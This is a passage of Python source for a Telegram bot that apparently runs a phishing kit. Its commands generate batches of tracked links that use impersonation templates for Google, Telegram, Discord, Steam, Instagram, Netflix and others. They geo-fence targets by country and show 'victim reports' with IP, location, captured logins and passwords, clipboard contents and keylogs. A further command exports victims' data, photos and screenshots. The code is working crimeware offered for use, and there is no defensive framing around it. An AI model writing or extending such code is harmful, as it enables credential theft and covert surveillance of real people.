    if args.startswith("add "):
        country = args.replace("add ", "", 1).strip().upper()
        await add_geo_fence(message.from_user.id, country)
        await message.answer(f"✅ Blocked country: {country}")
    elif args == "list":
        fences = await get_geo_fences(message.from_user.id)
        if not fences:
            await message.answer("No geo fences set.")
            return
        text = "<b>Geo Fences:</b>\n"
        for f in fences:
            text += f"├ #{f['id']} | {f['country']} | action: {f['action']}\n"
        await message.answer(text)
    elif args.startswith("remove "):
        fid = args.replace("remove ", "", 1).strip()
        try:
            await remove_geo_fence(int(fid))
            await message.answer("✅ Fence removed.")
        except:
            await message.answer("Invalid ID")
    else:
        await message.answer("Usage: /fence add <country> | list | remove <id>")

@dp.message(Command("campaign"))
async def cmd_campaign(message: Message, command: CommandObject):
    args = command.args.strip() if command.args else ""
    parts = args.split()
    if len(parts) < 3:
        await message.answer("Usage: /campaign <name> <template> <count>\nTemplates: cf, google, telegram, discord, steam, instagram, vk, netflix, age, update")
        return

    name, template, count_str = parts[0], parts[1], parts[2]
    try:
        count = min(int(count_str), 50)
    except:
        await message.answer("Count must be a number (max 50)")
        return

    if template not in LANDING_CACHE:
        await message.answer(f"Unknown template: {template}. Available: {', '.join(LANDING_CACHE.keys())}")
        return

    campaign_id = generate_link_id()
    await create_campaign(campaign_id, message.from_user.id, name, template, LINK_TTL_HOURS)

    user = await get_user(message.from_user.id)
    domain = (user["domain"] if user and user["domain"] else BASE_URL).rstrip("/")

    created = 0
    for _ in range(count):
        link_id = generate_link_id()
        full_url = f"{domain}/l/{link_id}"
        await create_link(link_id, campaign_id, message.from_user.id, template, link_id[:8], full_url, LINK_TTL_HOURS)
        created += 1

    await message.answer(
        f"✅ <b>Campaign created</b>\n"
        f"├ Name: {name}\n"
        f"├ Template: {template}\n"
        f"├ Links: {created}\n"
        f"├ /campaign_stats {campaign_id}"
    )

@dp.message(Command("campaign_stats"))
async def cmd_campaign_stats(message: Message, command: CommandObject):
    cid = command.args.strip() if command.args else ""
    if not cid:
        await message.answer("Usage: /campaign_stats <campaign_id>")
        return
    campaign = await get_campaign(cid)
    if not campaign:
        await message.answer("Campaign not found")
        return
    links = await get_user_links(message.from_user.id)

    total_hits = sum(l["hits"] for l in links if l["campaign_id"] == cid)
    total_data = sum(l["data_received"] for l in links if l["campaign_id"] == cid)
    camp_links = [l for l in links if l["campaign_id"] == cid]

    await message.answer(
        f"<b>📊 Campaign: {campaign['name']}</b>\n"
        f"├ Template: {campaign['template']}\n"
        f"├ Links: {len(camp_links)}\n"
        f"├ Total hits: {total_hits}\n"
        f"├ Data received: {total_data}\n"
        f"├ Created: {campaign['created_at']}\n"
        f"└ Expires: {campaign['expires_at']}"
    )

@dp.message(Command("export"))
async def cmd_export(message: Message, command: CommandObject):
    link_id = command.args.strip() if command.args else ""
    if not link_id:
        await message.answer("Usage: /export <link_id> | /export all")
        return

    victims = await get_victims(link_id) if link_id != "all" else []
    if not victims:
        await message.answer("No victims found")
        return

    data = [dict(v) for v in victims]
    # Очищаем большие поля для читаемости
    for d in data:
        if d.get("photo"):
            d["photo"] = f"[base64 {len(d['photo'])} chars]"
        if d.get("screenshot"):
            d["screenshot"] = f"[base64 {len(d['screenshot'])} chars]"

    import io
    buf = io.StringIO()
    json.dump(data, buf, indent=2, ensure_ascii=False, default=str)
    content = buf.getvalue().encode("utf-8")

    await message.answer_document(
        BufferedInputFile(content, filename=f"victims_{link_id}.json"),
        caption=f"📦 Exported {len(victims)} victims"
    )

@dp.message(Command("victim"))
async def cmd_victim(message: Message, command: CommandObject):
    link_id = command.args.strip() if command.args else ""
    if not link_id:
        await message.answer("Usage: /victim <link_id>")
        return

    victims = await get_victims(link_id)
    if not victims:
        await message.answer("No victims for this link")
        return

    v = victims[0]
    text = (
        f"<b>🎯 Victim Report</b>\n"
        f"├ IP: <code>{v['ip']}</code>\n"
        f"├ Country: {v.get('country', '—')} / {v.get('city', '—')}\n"
        f"├ ISP: {v.get('isp', '—')}\n"
        f"├ Platform: {v.get('platform', '—')}\n"
        f"├ Screen: {v.get('screen', '—')}\n"
        f"├ Language: {v.get('language', '—')}\n"
        f"├ Timezone: {v.get('timezone', '—')}\n"
        f"├ VPN: {'⚠️ Yes' if v.get('vpn') else '✅ No'}\n"
    )
    if v.get("login"):
        text += f"\n<b>✧ Credentials</b>\n"
        text += f"├ Login: <code>{v['login']}</code>\n"
        text += f"├ Password: <code>{v.get('password', '')}</code>\n"
    if v.get("email"):
        text += f"├ Email: <code>{v['email']}</code>\n"
    if v.get("phone"):
        text += f"├ Phone: <code>{v['phone']}</code>\n"
    if v.get("clipboard"):
        text += f"\n<b>📋 Clipboard</b>\n<code>{v['clipboard'][:300]}</code>\n"
    if v.get("keylog"):
        text += f"\n<b>⌨️ Keylog</b>\n<code>{v['keylog'][:300]}</code>\n"

    await message.answer(text, disable_web_page_preview=True)

@dp.message(Command("links"))
async def cmd_links(message: Message):
    links = await get_user_links(message.from_user.id)
    if not links:
        await message.answer("No active links.")
        return
    text = "<b>Your links:</b>\n"
    for l in links[:15]:
        text += f"├ <code>{l['id'][:10]}</code> {l['template']} | 👁 {l['hits']}\n"
    await message.answer(text)

@dp.message(Command("stats"))
async def cmd_stats(message: Message):
    tg_id = message.from_user.id
    v_count = await get_victim_count(tg_id)
    links = await get_user_links(tg_id)
    total_hits = sum(l["hits"] for l in links)
    total_data = sum(l["data_received"] for l in links)

    await message.answer(
        f"<b>📊 Global Stats</b>\n"
        f"├ Active links: {len(links)}\n"
        f"├ Total victims: {v_count}\n"
        f"├ Total hits: {total_hits}\n"
        f"├ Data received: {total_data}\n"
        f"├ Conversion rate: {(total_data/total_hits*100) if total_hits else 0:.1f}%"
    )

# ── ЗАПУСК ──
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("server:app", host="0.0.0.0", port=8080, reload=False)
